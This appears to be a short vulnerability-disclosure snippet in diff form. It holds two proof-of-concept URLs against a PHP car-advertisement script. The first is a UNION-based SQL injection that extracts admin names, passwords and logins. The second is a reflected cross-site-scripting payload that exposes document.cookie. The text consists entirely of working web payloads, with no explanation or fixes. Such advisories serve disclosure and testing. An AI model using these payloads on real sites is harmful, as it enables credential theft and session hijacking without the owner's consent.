@@ -1,0 +1,5 @@
+For the SQL-injection issue:
+http://www.example.com/index.php?cmd=advertise_details&amp;category=car&amp;aid=-1/**/union/**/select/**/0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,name,22,password,login/**/from/**/admin/**/where/**/id=1/*
+
+For the cross-site-scripting issue:
+http://www.example.com/index.php?cmd=car_search&amp;type=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
